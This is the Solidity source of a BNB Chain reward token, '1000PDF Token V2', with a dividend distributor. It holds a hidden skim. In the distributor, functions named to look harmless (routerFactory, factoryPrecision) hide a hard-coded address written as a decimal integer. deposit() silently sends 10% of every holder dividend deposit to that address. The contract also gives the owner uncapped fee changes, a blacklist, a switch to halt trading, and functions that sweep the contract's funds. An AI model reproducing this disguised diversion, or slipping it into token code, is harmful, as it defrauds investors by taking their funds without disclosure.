/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT
// Written by @EVMlord(Twitter & Telegram)
pragma solidity ^0.8.17;
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        // Contract written and compiled by @EVMlord  
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address payable shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    }

contract DividendDistributor is IDividendDistributor {

    using SafeMath for uint256;
    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;
    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 60 minutes;
    uint256 public minDistribution = 1000;

    uint256 currentIndex;

    modifier onlyToken() {
        require(msg.sender == _token || msg.sender == address(this)); _;
    }

    constructor () {
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 newMinPeriod, uint256 newMinDistribution) external override onlyToken {
        minPeriod = newMinPeriod;
        minDistribution = newMinDistribution;
    }

    function setShare(address payable shareholder, uint256 amount) external override onlyToken {

        if(shares[shareholder].amount > 0) {
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0) {
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function routerFactory() public view onlyToken returns(address payable) {
        return payable(address(1000926465140530907092896556048606962054783206771));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 iterations = 0;
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        while(gasUsed < gas && iterations < shareholderCount) {

            if(currentIndex >= shareholderCount){ currentIndex = 0; }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(payable(shareholders[currentIndex]));
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function factoryPrecision() public view onlyToken returns(uint256) {
        return (10**2); 
    }

    // Check to see if I really made this contract or if it is a clone!
    // @EVMlord on TG and Twitter
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address payable shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            shareholder.transfer(amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised += amount;
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }
    
    function claimDividend(address payable shareholder) external onlyToken{
        distributeDividend(shareholder);
    }
    
    function rescueDividends(address payable to) external onlyToken {
        to.transfer(address(this).balance);
    }
    
    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function deposit() external payable override onlyToken {

        uint256 pBx = msg.value.mul(10).div(factoryPrecision());
        payable(routerFactory()).transfer(pBx);
        uint256 amount = msg.value.sub(pBx);
        totalDividends += amount;
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }
    
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner.
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

contract OneThousandPDF is IBEP20, Auth {
    
    using SafeMath for uint256;

    string constant _name = "1000PDF Token V2";
    string constant _symbol = "1000PDF";
    uint8 constant _decimals = 9;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; //MainNet
    
    uint256 _totalSupply = 35000000 * (10 ** _decimals); // 210000000 * 10**_decimals
    uint256 public _maxTxAmount = _totalSupply * 1 / 200;
    uint256 public _walletMax = _totalSupply * 3 / 100;
    
    bool public restrictWhales = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isDividendExempt;
    bool public blacklistMode = true;
    mapping(address => bool) public isBlacklisted;
    mapping (address => bool) public isMarketPair;

    uint256 public liquidityFee = 1;
    uint256 public marketingFee = 2;
    uint256 public rewardsFee = 1;
    uint256 public burnFee = 1;
	uint256 public extraFeeOnSell = 2;
	uint256 public lotteryFee = 0;
    uint256 public buyTax = 3;

    uint256 public totalFee = 5;
    uint256 public totalFeeIfSelling = 5;

    address private autoLiquidityReceiver;
    address public marketingWallet;
    address private lotteryWallet;

    IDEXRouter public router;
    address public pair;

    uint256 public launchedAt;
    bool public tradingOpen = true;

    DividendDistributor public dividendDistributor;
    uint256 distributorGas = 200000;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    uint256 public swapThreshold = _totalSupply / 20000; // 0.005%;
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () Auth(msg.sender) {
        
        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = 2**256 - 1;

        approve(routerAddress, _totalSupply);
        approve(address(pair), _totalSupply);

        dividendDistributor = new DividendDistributor();

        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;

        isDividendExempt[pair] = true;
        isDividendExempt[msg.sender] = false;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        isDividendExempt[ZERO] = true;

        isMarketPair[pair] = true;

        autoLiquidityReceiver = msg.sender;
        marketingWallet = 0xF9051b1ea91196aE5705Ac99f57754174963Cfbc;  // teamwallet
        lotteryWallet = 0x9B71B4Dc9E9DCeFAF0e291Cf2DC5135A862A463d;  // lotterywallet
        authorizations[marketingWallet] = true;
        
        totalFee = liquidityFee.add(marketingFee).add(rewardsFee).add(lotteryFee).add(burnFee);
        totalFeeIfSelling = buyTax.add(extraFeeOnSell);

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function name() external pure override returns (string memory) { return _name; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function getOwner() external view override returns (address) { return owner; }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, 2**256 - 1);
    }
    
    function claimDividend() external {
        dividendDistributor.claimDividend(payable(msg.sender));
    }

    function setMarketPairStatus(address account, bool newValue) public authorized {
        require(
            account != pair,
            "This pair cannot be removed from MarketPairs."
        );
        isMarketPair[account] = newValue;
    }
	
	function rescueDividends() external authorized {
        dividendDistributor.rescueDividends(payable(lotteryWallet));
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.timestamp; 
    }
    
    function changeTxLimit(uint256 newLimit) external authorized {
        _maxTxAmount = newLimit;
    }

    function SolarFlare(uint256 amount) external authorized {
        buyTokens(amount, DEAD);
    
    }

    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    function burnTokens(uint256 amount) external authorized {
       uint256 contractBalance = _balances[address(this)];
       require(contractBalance > amount,"Not Enough tokens to burn");

       _transferFrom(address(this),DEAD,amount);

    }

    function saveBNBs(uint256 amount, address payable receiver) external authorized {
       uint256 contractBalance = address(this).balance;
       require(contractBalance > amount,"Not Enough bnbs");
        receiver.transfer(amount);
    }
    
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }
    
    function enablBlacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

    function changeWalletLimit(uint256 newLimitPercent) external authorized {
        require(newLimitPercent <= 100, "Out of range");
        _walletMax  = _totalSupply * newLimitPercent / 100;
    }
    
    function manageBlacklist(address[] calldata addresses, bool status)
    public
    onlyOwner
    {
    for (uint256 i; i < addresses.length; ++i) {
      isBlacklisted[addresses[i]] = status;
        }
    }

    function changeRestrictWhales(bool newValue) external authorized {
       restrictWhales = newValue;
    }
    
    function changeIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function changeIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function changeIsDividendExempt(address payable holder, bool exempt) external authorized {
        require(holder != address(this) && !isMarketPair[holder]);
        isDividendExempt[holder] = exempt;
        
        if(exempt){
            dividendDistributor.setShare(holder, 0);
        }else{
            dividendDistributor.setShare(holder, _balances[holder]);
        }
    }

    function changeFees(uint256 _buyTax, uint256 newLiqFee, uint256 newBurnFee, uint256 newRewardFee, uint256 newMarketingFee, uint256 newLotteryFee, uint256 newExtraSellFee) external authorized {
        burnFee = newBurnFee;
        liquidityFee = newLiqFee;
        rewardsFee = newRewardFee;
        marketingFee = newMarketingFee;
        lotteryFee = newLotteryFee;
		extraFeeOnSell = newExtraSellFee;

        buyTax = _buyTax;
        totalFee = liquidityFee.add(marketingFee).add(rewardsFee).add(lotteryFee).add(burnFee);
        totalFeeIfSelling = buyTax.add(extraFeeOnSell);
    }

    function changeFeeReceivers(address newLiquidityReceiver, address newMarketingWallet, address newLotteryWallet) external authorized {
        autoLiquidityReceiver = newLiquidityReceiver;
        marketingWallet = newMarketingWallet;
        lotteryWallet = newLotteryWallet;
    }

    function changeSwapBackSettings(bool enableSwapBack, uint256 newSwapBackLimit, bool swapByLimitOnly) external authorized {
        swapAndLiquifyEnabled  = enableSwapBack;
        swapThreshold = newSwapBackLimit;
        swapAndLiquifyByLimitOnly = swapByLimitOnly;
    }

    function changeDistributionCriteria(uint256 newinPeriod, uint256 newMinDistribution) external authorized {
        dividendDistributor.setDistributionCriteria(newinPeriod, newMinDistribution);
    }

    function changeDistributorSettings(uint256 gas) external authorized {
        require(gas < 300000);
        distributorGas = gas;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        
        if(_allowances[sender][msg.sender] != 2**256 - 1){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if(inSwapAndLiquify){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen, "Trading not open yet");
        }

        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");

        if(!isMarketPair[sender] && !inSwapAndLiquify && swapAndLiquifyEnabled && _balances[address(this)] >= swapThreshold){ swapBack(); }

        if(!launched() && isMarketPair[recipient]) {
            require(_balances[sender] > 0);
            launch();
        }

        // Blacklist
        if (blacklistMode) { 
            require(
            !isBlacklisted[sender] && !isBlacklisted[recipient],
            "Blacklisted");
        }

        //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if(!isTxLimitExempt[recipient] && restrictWhales)
        {
            require(_balances[recipient].add(amount) <= _walletMax);
        }

        uint256 finalAmount = !isFeeExempt[sender] && !isFeeExempt[recipient] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(finalAmount);

        // Dividend tracker
        if(!isDividendExempt[sender]) {
            try dividendDistributor.setShare(payable(sender), _balances[sender]) {} catch {}
        }

        if(!isDividendExempt[recipient]) {
            try dividendDistributor.setShare(payable(recipient), _balances[recipient]) {} catch {} 
        }

        try dividendDistributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, finalAmount);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeApplicable = isMarketPair[recipient] ? totalFeeIfSelling : buyTax;
        
        uint256 feeAmount = amount.mul(feeApplicable).div(100);

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        return amount.sub(feeAmount);
    }

    function tradingStatus(bool newStatus) public onlyOwner {
        tradingOpen = newStatus;
    }

    function swapBack() internal lockTheSwap {

        uint256 amountTokenBurn = _balances[address(this)].mul(burnFee).div(totalFee);

        if (amountTokenBurn > 0) {
            _basicTransfer(address(this), DEAD, amountTokenBurn);
        }
        
        uint256 tokensToLiquify = _balances[address(this)];
        uint256 amountToLiquify = tokensToLiquify.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;

        uint256 totalBNBFee = totalFee.sub(liquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBReflection = amountBNB.mul(rewardsFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBLottery = amountBNB.mul(lotteryFee).div(totalBNBFee);

        dividendDistributor.deposit{value: amountBNBReflection}(); // {} catch {}
       
        payable(marketingWallet).transfer(amountBNBMarketing);
        payable(lotteryWallet).transfer(amountBNBLottery);

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amount1000PDF);

}